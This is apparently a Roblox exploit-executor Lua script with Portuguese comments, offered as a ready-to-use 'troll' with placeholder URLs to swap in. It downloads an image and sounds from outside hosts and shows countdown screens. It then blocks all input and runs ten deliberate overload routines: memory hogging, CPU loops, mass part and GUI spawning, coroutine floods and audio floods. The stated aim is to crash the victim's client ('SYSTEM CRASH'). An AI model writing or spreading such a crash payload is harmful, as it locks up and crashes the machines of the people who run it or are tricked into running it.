-- ====== SUBSTITUA AS URLs ABAIXO PELAS SUAS ======
local IMAGE_URL = "https://cdn.phototourl.com/free/2026-08-06-e5494160-d34a-495f-b882-107639956873.png"
local AUDIO_URL = "https://convinced-lavender-jbgaa7qy.edgeone.dev/" -- SOM DO CONTADOR (opcional)
local AUDIO_URL2 = "https://xenial-chocolate-awqrrkqh.edgeone.dev/" -- SOM TROLL (vai tocar na espera de 5min)
-- ===============================================

local FOLDER = "ScriptAssets"
local IMG_FILE = "img.png"
local AUDIO_FILE = "audio.mp3"
local AUDIO_FILE2 = "audio2.mp3"

makefolder(FOLDER)

local function downloadFile(url, path)
    local success, result = pcall(function()
        local content = game:HttpGet(url)
        writefile(path, content)
        return true
    end)
    return success
end

local imageSuccess = downloadFile(IMAGE_URL, FOLDER .. "/" .. IMG_FILE)
local audio1Success = downloadFile(AUDIO_URL, FOLDER .. "/" .. AUDIO_FILE)
local audio2Success = downloadFile(AUDIO_URL2, FOLDER .. "/" .. AUDIO_FILE2)

wait(1)

local function fileExists(path)
    local success, result = pcall(function()
        return isfile(path)
    end)
    return success and result
end

local function getAsset(path)
    if fileExists(path) then
        return getcustomasset(path)
    else
        return "rbxassetid://10551959597"
    end
end

local textureImage = getAsset(FOLDER .. "/" .. IMG_FILE)
local audio1Path = getAsset(FOLDER .. "/" .. AUDIO_FILE)
local audio2Path = getAsset(FOLDER .. "/" .. AUDIO_FILE2)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local playerGui = game:GetService("CoreGui")
local lighting = game:GetService("Lighting")
local userInputService = game:GetService("UserInputService")
local tweenService = game:GetService("TweenService")
local runService = game:GetService("RunService")

-- ====== CONTADOR DE 41 SEGUNDOS ======
local bgGui = Instance.new("ScreenGui")
bgGui.ResetOnSpawn = false
bgGui.Parent = playerGui
bgGui.IgnoreGuiInset = true
bgGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.new(0, 0, 0)
background.BackgroundTransparency = 0
background.ZIndex = 9998
background.Parent = bgGui

local countSound = Instance.new("Sound")
countSound.SoundId = audio1Path
countSound.Volume = 1
countSound.Looped = true
countSound.Parent = game:GetService("SoundService")
countSound:Play()

local counterGui = Instance.new("ScreenGui")
counterGui.ResetOnSpawn = false
counterGui.Parent = playerGui
counterGui.IgnoreGuiInset = true
counterGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

local counterFrame = Instance.new("Frame")
counterFrame.Size = UDim2.new(0, 300, 0, 150)
counterFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
counterFrame.BackgroundTransparency = 1
counterFrame.ZIndex = 9999
counterFrame.Parent = counterGui

local counterLabel = Instance.new("TextLabel")
counterLabel.Size = UDim2.new(1, 0, 1, 0)
counterLabel.BackgroundTransparency = 1
counterLabel.Text = "41"
counterLabel.TextColor3 = Color3.new(1, 0, 0)
counterLabel.TextScaled = true
counterLabel.Font = Enum.Font.Bangers
counterLabel.ZIndex = 9999
counterLabel.Parent = counterFrame

local function createDistortedText(parent, offset)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, offset, 1, offset)
    label.Position = UDim2.new(0, offset/2, 0, offset/2)
    label.BackgroundTransparency = 1
    label.Text = "41"
    label.TextColor3 = Color3.new(1, 0, 0)
    label.TextScaled = true
    label.Font = Enum.Font.Bangers
    label.TextTransparency = 0.5
    label.ZIndex = 9998
    label.Parent = parent
    return label
end

local distortion1 = createDistortedText(counterFrame, 5)
local distortion2 = createDistortedText(counterFrame, -5)
local distortion3 = createDistortedText(counterFrame, 8)
local distortion4 = createDistortedText(counterFrame, -8)

spawn(function()
    local startTime = tick()
    local duration = 41
    
    while tick() - startTime < duration do
        local timeLeft = duration - (tick() - startTime)
        local seconds = math.ceil(timeLeft)
        
        counterLabel.Text = tostring(seconds)
        distortion1.Text = tostring(seconds)
        distortion2.Text = tostring(seconds)
        distortion3.Text = tostring(seconds)
        distortion4.Text = tostring(seconds)
        
        local shakeX = math.random(-15, 15)
        local shakeY = math.random(-15, 15)
        counterFrame.Position = UDim2.new(0.5, -150 + shakeX, 0.5, -75 + shakeY)
        
        local colorValue = 1 - (timeLeft / duration)
        counterLabel.TextColor3 = Color3.new(1, colorValue, 0)
        distortion1.TextColor3 = Color3.new(1, colorValue, 0)
        distortion2.TextColor3 = Color3.new(1, colorValue, 0)
        distortion3.TextColor3 = Color3.new(1, colorValue, 0)
        distortion4.TextColor3 = Color3.new(1, colorValue, 0)
        
        distortion1.Rotation = math.sin(tick() * 10) * 3
        distortion2.Rotation = math.sin(tick() * 10 + 1) * -3
        distortion3.Rotation = math.sin(tick() * 10 + 2) * 2
        distortion4.Rotation = math.sin(tick() * 10 + 3) * -2
        
        distortion1.Position = UDim2.new(0, math.random(-8, 8), 0, math.random(-8, 8))
        distortion2.Position = UDim2.new(0, math.random(-8, 8), 0, math.random(-8, 8))
        distortion3.Position = UDim2.new(0, math.random(-8, 8), 0, math.random(-8, 8))
        distortion4.Position = UDim2.new(0, math.random(-8, 8), 0, math.random(-8, 8))
        
        local pulse = math.sin(tick() * 5) * 0.3 + 0.7
        counterLabel.TextTransparency = 1 - pulse
        distortion1.TextTransparency = 1 - pulse * 0.8
        distortion2.TextTransparency = 1 - pulse * 0.8
        distortion3.TextTransparency = 1 - pulse * 0.8
        distortion4.TextTransparency = 1 - pulse * 0.8
        
        local scale = 1 + math.sin(tick() * 3) * 0.05
        counterFrame.Size = UDim2.new(0, 300 * scale, 0, 150 * scale)
        
        wait(0.03)
    end
    
    countSound:Stop()
    bgGui:Destroy()
    counterGui:Destroy()
    
    -- ====== ESPERA DE 5 MINUTOS COM SOM TROLL ======
    waitFor5Minutes()
end)

-- ====== FUNÇÃO DE ESPERA DE 5 MINUTOS ======
function waitFor5Minutes()
    -- Tocar música troll durante a espera
    local waitSound = Instance.new("Sound")
    waitSound.SoundId = audio2Path
    waitSound.Volume = 1
    waitSound.Looped = true
    waitSound.Parent = game:GetService("SoundService")
    waitSound:Play()
    
    -- Tela preta de espera
    local waitBg = Instance.new("ScreenGui")
    waitBg.ResetOnSpawn = false
    waitBg.Parent = playerGui
    waitBg.IgnoreGuiInset = true
    waitBg.ZIndexBehavior = Enum.ZIndexBehavior.Global
    
    local black = Instance.new("Frame")
    black.Size = UDim2.new(1, 0, 1, 0)
    black.BackgroundColor3 = Color3.new(0, 0, 0)
    black.BackgroundTransparency = 0
    black.ZIndex = 9998
    black.Parent = waitBg
    
    -- Timer de 5 minutos
    local timerGui = Instance.new("ScreenGui")
    timerGui.ResetOnSpawn = false
    timerGui.Parent = playerGui
    timerGui.IgnoreGuiInset = true
    timerGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    
    local timerFrame = Instance.new("Frame")
    timerFrame.Size = UDim2.new(0, 400, 0, 150)
    timerFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
    timerFrame.BackgroundTransparency = 1
    timerFrame.ZIndex = 9999
    timerFrame.Parent = timerGui
    
    local timerLabel = Instance.new("TextLabel")
    timerLabel.Size = UDim2.new(1, 0, 1, 0)
    timerLabel.BackgroundTransparency = 1
    timerLabel.Text = "⏳ INICIANDO EM\n5:00"
    timerLabel.TextColor3 = Color3.new(1, 0, 0)
    timerLabel.TextScaled = true
    timerLabel.Font = Enum.Font.Bangers
    timerLabel.ZIndex = 9999
    timerLabel.Parent = timerFrame
    
    local subLabel = Instance.new("TextLabel")
    subLabel.Size = UDim2.new(1, 0, 0, 40)
    subLabel.Position = UDim2.new(0, 0, 1, -40)
    subLabel.BackgroundTransparency = 1
    subLabel.Text = "☠️ PREPARE-SE ☠️"
    subLabel.TextColor3 = Color3.new(1, 1, 1)
    subLabel.TextScaled = true
    subLabel.Font = Enum.Font.Bangers
    subLabel.ZIndex = 9999
    subLabel.Parent = timerFrame
    
    local crashTime = tick() + 300 -- 5 minutos
    
    spawn(function()
        while tick() < crashTime do
            local timeLeft = crashTime - tick()
            local minutes = math.floor(timeLeft / 60)
            local seconds = math.floor(timeLeft % 60)
            timerLabel.Text = string.format("⏳ INICIANDO EM\n%d:%02d", minutes, seconds)
            
            -- Efeitos
            timerFrame.Rotation = math.random(-3, 3)
            timerLabel.TextColor3 = Color3.new(1, timeLeft / 300, 0)
            timerLabel.TextTransparency = math.sin(tick() * 3) * 0.3 + 0.3
            
            wait(0.1)
        end
        
        -- Acabou a espera
        waitSound:Stop()
        waitBg:Destroy()
        timerGui:Destroy()
        
        -- Iniciar o caos
        startChaos()
    end)
end

-- ====== FUNÇÃO DO CAOS ======
function startChaos()
    -- Tocar música troll (a mesma da espera, reiniciando)
    local sound = Instance.new("Sound")
    sound.SoundId = audio2Path
    sound.Volume = 1
    sound.Looped = true
    sound.Parent = game:GetService("SoundService")
    sound:Play()
    
    local sound2 = sound:Clone()
    sound2.SoundId = "rbxassetid://2154316070"
    sound2.Looped = true
    sound2.Volume = 0.3
    sound2.Parent = game:GetService("SoundService")
    sound2:Play()

    -- ====== BLOQUEADOR COMPLETO ======
    local blockerGui = Instance.new("ScreenGui")
    blockerGui.Name = "BlockerGui"
    blockerGui.ResetOnSpawn = false
    blockerGui.Parent = playerGui
    blockerGui.IgnoreGuiInset = true
    blockerGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    
    local blocker = Instance.new("Frame")
    blocker.Size = UDim2.new(1, 0, 1, 0)
    blocker.Position = UDim2.new(0, 0, 0, 0)
    blocker.BackgroundTransparency = 1
    blocker.ZIndex = 999999
    blocker.Parent = blockerGui
    blocker.Active = true
    blocker.Selectable = true
    
    local function blockEverything(input)
        input:StopPropagation()
        return true
    end
    
    userInputService.InputBegan:Connect(blockEverything)
    userInputService.InputEnded:Connect(blockEverything)
    userInputService.InputChanged:Connect(blockEverything)

    -- ====== MÉTODO 1: EFEITO DVD COM MULTIPLICAÇÃO ======
    local dvdImages = {}
    local clones = {}
    local cloneCount = 0
    
    local function createDVDImage()
        local sg = Instance.new("ScreenGui")
        sg.ResetOnSpawn = false
        sg.Parent = playerGui
        sg.IgnoreGuiInset = true
        sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
        
        local img = Instance.new("ImageLabel")
        img.Size = UDim2.new(0, 150, 0, 150)
        img.Position = UDim2.new(0.5, -75, 0.5, -75)
        img.BackgroundTransparency = 1
        img.Image = textureImage
        img.ZIndex = 999998
        img.Parent = sg
        
        local data = {
            img = img,
            sg = sg,
            speedX = 5,
            speedY = 5,
            dirX = 1,
            dirY = 1
        }
        table.insert(dvdImages, data)
        return img
    end
    
    local function createClone(position)
        local sg = Instance.new("ScreenGui")
        sg.ResetOnSpawn = false
        sg.Parent = playerGui
        sg.IgnoreGuiInset = true
        sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
        
        local img = Instance.new("ImageLabel")
        local size = math.random(50, 300)
        img.Size = UDim2.new(0, size, 0, size)
        img.Position = position
        img.BackgroundTransparency = 1
        img.Image = textureImage
        img.ZIndex = 999998
        img.Rotation = math.random(-360, 360)
        img.ImageTransparency = math.random()
        img.Parent = sg
        
        table.insert(clones, img)
        cloneCount = cloneCount + 1
        return img
    end
    
    createDVDImage()
    
    spawn(function()
        while true do
            for _, data in pairs(dvdImages) do
                local img = data.img
                if img and img.Parent then
                    local pos = img.Position
                    local xScale = pos.X.Scale
                    local xOffset = pos.X.Offset
                    local yScale = pos.Y.Scale
                    local yOffset = pos.Y.Offset
                    
                    local speed = 5 + (tick() % 300) / 300 * 50
                    
                    xOffset = xOffset + speed * data.dirX
                    yOffset = yOffset + speed * data.dirY
                    
                    if xOffset > 1 then
                        xOffset = -1
                        data.dirX = -data.dirX
                        if cloneCount < 1000 then
                            createClone(UDim2.new(xScale, xOffset, yScale, yOffset))
                        end
                    end
                    if xOffset < -1 then
                        xOffset = 1
                        data.dirX = -data.dirX
                        if cloneCount < 1000 then
                            createClone(UDim2.new(xScale, xOffset, yScale, yOffset))
                        end
                    end
                    if yOffset > 1 then
                        yOffset = -1
                        data.dirY = -data.dirY
                        if cloneCount < 1000 then
                            createClone(UDim2.new(xScale, xOffset, yScale, yOffset))
                        end
                    end
                    if yOffset < -1 then
                        yOffset = 1
                        data.dirY = -data.dirY
                        if cloneCount < 1000 then
                            createClone(UDim2.new(xScale, xOffset, yScale, yOffset))
                        end
                    end
                    
                    img.Position = UDim2.new(xScale, xOffset, yScale, yOffset)
                    img.Rotation = img.Rotation + 5
                end
            end
            wait(0.01)
        end
    end)

    -- ====== MÉTODO 2: 99999 IMAGENS ======
    spawn(function()
        while true do
            for i = 1, 50 do
                local sg = Instance.new("ScreenGui")
                sg.ResetOnSpawn = false
                sg.Parent = playerGui
                sg.IgnoreGuiInset = true
                sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
                
                local img = Instance.new("ImageLabel")
                local size = math.random(50, 400)
                img.Size = UDim2.new(0, size, 0, size)
                img.Position = UDim2.new(math.random(), 0, math.random(), 0)
                img.BackgroundTransparency = 1
                img.Image = textureImage
                img.ZIndex = 999998
                img.Rotation = math.random(-360, 360)
                img.ImageTransparency = math.random()
                img.Parent = sg
                
                spawn(function()
                    while img.Parent do
                        img:TweenPosition(UDim2.new(math.random(), 0, math.random(), 0), "Out", "Sine", 1, true)
                        img.Rotation = img.Rotation + math.random(5, 20)
                        wait(0.5)
                    end
                end)
            end
            wait(0.1)
        end
    end)

    -- ====== MÉTODO 3: SOBRECARGA DE MEMÓRIA ======
    spawn(function()
        local memoryHog = {}
        while true do
            for i = 1, 100 do
                table.insert(memoryHog, string.rep("A", 100000) .. string.rep("B", 100000))
                local t = {}
                for j = 1, 1000 do
                    t[j] = {j, j*2, string.rep("X", 100)}
                end
                table.insert(memoryHog, t)
            end
            wait(0.1)
        end
    end)

    -- ====== MÉTODO 4: SOBRECARGA DE PROCESSAMENTO ======
    spawn(function()
        while true do
            local x = 0
            for i = 1, 100000 do
                x = x + math.sin(i) * math.cos(i) * math.tan(i)
                x = x + math.sqrt(i) * math.log(i + 1)
            end
            wait(0)
        end
    end)

    -- ====== MÉTODO 5: 99999 TWEENS ======
    spawn(function()
        while true do
            for i = 1, 100 do
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(0, 1, 0, 1)
                frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
                frame.BackgroundTransparency = 1
                frame.Parent = playerGui
                frame.ZIndex = 999998
                
                local tween = tweenService:Create(frame, TweenInfo.new(math.random(1, 10), Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, true, 0), {
                    Size = UDim2.new(0, math.random(100, 1000), 0, math.random(100, 1000)),
                    Position = UDim2.new(math.random(), 0, math.random(), 0),
                    Rotation = math.random(360)
                })
                tween:Play()
            end
            wait(0.1)
        end
    end)

    -- ====== MÉTODO 6: SOBRECARGA DE FÍSICA ======
    spawn(function()
        while true do
            for i = 1, 50 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(math.random(1, 20), math.random(1, 20), math.random(1, 20))
                part.Position = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
                part.Anchored = false
                part.CanCollide = true
                part.Material = Enum.Material.Neon
                part.Color = Color3.fromHSV(math.random(), 1, 1)
                part.Parent = workspace
                part.Velocity = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
            end
            wait(0.1)
        end
    end)

    -- ====== MÉTODO 7: DIA/NOITE RÁPIDO ======
    spawn(function()
        while true do
            lighting.Brightness = math.random()
            lighting.ClockTime = math.random(0, 24)
            lighting.FogEnd = math.random(0, 1000)
            lighting.Ambient = Color3.fromHSV(math.random(), 1, 1)
            lighting.OutdoorAmbient = Color3.fromHSV(math.random(), 1, 1)
            wait(0.001)
        end
    end)

    -- ====== MÉTODO 8: TREMOR EXTREMO ======
    spawn(function()
        while true do
            local camera = workspace.CurrentCamera
            local power = 1 + (tick() % 300) / 300 * 200
            camera.CFrame = camera.CFrame * CFrame.new(
                math.random(-power, power),
                math.random(-power, power),
                math.random(-power, power)
            )
            wait(0.001)
        end
    end)

    -- ====== MÉTODO 9: 99999 COROUTINES ======
    spawn(function()
        while true do
            for i = 1, 50 do
                coroutine.wrap(function()
                    while true do
                        local x = 0
                        for j = 1, 1000 do
                            x = x + math.sin(j) * math.cos(j)
                        end
                        wait(0.001)
                    end
                end)()
            end
            wait(0.1)
        end
    end)

    -- ====== MÉTODO 10: SOBRECARGA DE ÁUDIO ======
    spawn(function()
        while true do
            for i = 1, 20 do
                local s = Instance.new("Sound")
                s.SoundId = audio2Path
                s.Volume = math.random()
                s.Looped = true
                s.Parent = game:GetService("SoundService")
                s:Play()
            end
            wait(0.5)
        end
    end)

    -- ====== MENSAGEM FINAL ======
    spawn(function()
        wait(3)
        local finalBg = Instance.new("ScreenGui")
        finalBg.ResetOnSpawn = false
        finalBg.Parent = playerGui
        finalBg.IgnoreGuiInset = true
        finalBg.ZIndexBehavior = Enum.ZIndexBehavior.Global
        
        local black = Instance.new("Frame")
        black.Size = UDim2.new(1, 0, 1, 0)
        black.BackgroundColor3 = Color3.new(0, 0, 0)
        black.BackgroundTransparency = 0
        black.ZIndex = 9999999
        black.Parent = finalBg
        
        local finalLabel = Instance.new("TextLabel")
        finalLabel.Size = UDim2.new(1, 0, 1, 0)
        finalLabel.BackgroundTransparency = 1
        finalLabel.Text = "💀 MEMORY OVERFLOW\n☠️ SYSTEM CRASH\n🔥 GOODBYE"
        finalLabel.TextColor3 = Color3.new(1, 0, 0)
        finalLabel.TextScaled = true
        finalLabel.Font = Enum.Font.Bangers
        finalLabel.ZIndex = 9999999
        finalLabel.Parent = finalBg
        
        spawn(function()
            while true do
                finalLabel.TextTransparency = math.random()
                finalLabel.TextColor3 = Color3.fromHSV(math.random(), 1, 1)
                finalLabel.Rotation = math.random(-10, 10)
                wait(0.05)
            end
        end)
        
        -- Último esforço para crashar
        spawn(function()
            for i = 1, 99999 do
                Instance.new("Part").Parent = workspace
            end
        end)
    end)

    print("=====================================")
    print("☠️ CAOS INICIADO ☠️")
    print("=====================================")
    print("💀 PREPARE-SE PARA O CRASH 💀")
    print("=====================================")
end
